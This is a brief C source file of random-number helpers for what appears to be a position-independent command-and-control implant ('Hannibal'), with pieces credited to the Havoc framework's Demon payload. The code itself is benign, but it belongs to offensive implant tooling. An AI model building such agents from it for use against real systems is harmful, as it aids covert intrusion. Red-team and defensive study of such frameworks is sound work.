// Credit: Pieces adapted from https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon

#include "utility_rand.h"

SECTION_CODE ULONG pic_rand_number_32(
    VOID
) {
    HANNIBAL_INSTANCE_PTR

    ULONG Seed = 0;

    Seed = hannibal_instance_ptr->Win32.GetTickCount();
    Seed = hannibal_instance_ptr->Win32.RtlRandomEx( &Seed );
    Seed = hannibal_instance_ptr->Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}


SECTION_CODE ULONG gen_random_byte(ULONG *seed)
{
    HANNIBAL_INSTANCE_PTR

    return hannibal_instance_ptr->Win32.RtlRandomEx(seed) % 256;

}